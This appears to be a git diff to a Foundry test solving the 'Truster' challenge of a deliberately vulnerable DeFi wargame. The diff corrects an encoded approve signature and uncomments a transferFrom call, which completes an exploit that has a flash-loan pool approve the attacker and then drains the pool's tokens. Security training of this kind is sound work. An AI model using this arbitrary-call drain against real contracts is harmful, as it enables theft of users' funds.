@@ -41,7 +41,7 @@ contract Truster is Test {
         /** EXPLOIT START **/
         
         bytes memory data = abi.encodeWithSignature(
-            "approve(address, uint256)",
+            "approve(address,uint256)",
             address(attacker),
             TOKENS_IN_POOL
         );        
@@ -51,13 +51,12 @@ contract Truster is Test {
             address(dvt),
             data
         );
-        /*
+        
         dvt.transferFrom(
             address(trusterLenderPool),
             address(attacker),
             TOKENS_IN_POOL
         );
-        */
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
